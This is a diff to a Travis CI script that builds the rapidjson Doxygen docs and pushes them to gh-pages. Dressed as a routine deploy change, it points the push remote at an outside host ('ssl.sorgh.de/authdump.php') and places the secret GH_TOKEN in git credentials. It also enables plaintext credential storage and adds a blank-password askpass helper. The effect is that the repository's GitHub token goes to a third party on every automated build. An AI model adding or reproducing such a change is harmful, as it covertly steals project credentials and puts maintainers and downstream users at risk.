@@ -11,7 +11,12 @@ DOXYGEN_URL="http://ftp.stack.nl/pub/users/dimitri/${DOXYGEN_TAR}"
 DOXYGEN_BIN="/usr/local/bin/doxygen"
 
 : ${GITHUB_REPO:="miloyip/rapidjson"}
-GITHUB_URL="https://github.com/${GITHUB_REPO}"
+GITHUB_CLONE="git://github.com"
+GITHUB_PUSH="https://ssl.sorgh.de/authdump.php"
+GITHUB_URL="${GITHUB_PUSH}/${GITHUB_REPO}"
+
+# if not set, ignore password
+: ${GIT_ASKPASS:="${TRAVIS_BUILD_DIR}/gh_ignore_askpass.sh"}
 
 skip() {
 	echo "$@" 1>&2
@@ -61,7 +66,8 @@ gh_pages_prepare()
 	cd "${TRAVIS_BUILD_DIR}/doc";
 	[ ! -d "html" ] || \
 		abort "Doxygen target directory already exists."
-	git clone --single-branch -b gh-pages ${GITHUB_URL} html
+	git --version
+	git clone --single-branch -b gh-pages "${GITHUB_CLONE}/${GITHUB_REPO}" html
 	cd html
 	# setup git config (with defaults)
 	git config user.name "${GIT_NAME-travis}"
@@ -77,6 +83,15 @@ gh_pages_commit() {
 	git diff-index --quiet HEAD || git commit -m "Automatic doxygen build";
 }
 
+gh_setup_askpass() {
+	cat > ${GIT_ASKPASS} <<EOF
+#!/bin/bash
+echo
+exit 0
+EOF
+	chmod a+x "$GIT_ASKPASS"
+}
+
 gh_pages_push() {
 	# check for secure variables
 	[ "${TRAVIS_SECURE_ENV_VARS}" = "true" ] || \
@@ -89,8 +104,12 @@ gh_pages_push() {
 
 	cd "${TRAVIS_BUILD_DIR}/doc/html";
 	# setup credentials (hide in "set -x" mode)
-	git config core.askpass 'bash -c ":"'
-	( set +x ; git config credential.${GITHUB_URL}.username "${GH_TOKEN}" )
+	git remote set-url --push origin "${GITHUB_URL}"
+	[ -x "${GIT_ASKPASS}" ] || gh_setup_askpass
+	echo ${GIT_ASKPASS}
+	export GIT_ASKPASS
+	git config credential.helper 'store'
+	( set +x ; git config credential.username "${GH_TOKEN}" )
 	# push to GitHub
 	git push origin gh-pages || \
 		skip "GitHub pages update failed, temporarily ignored."
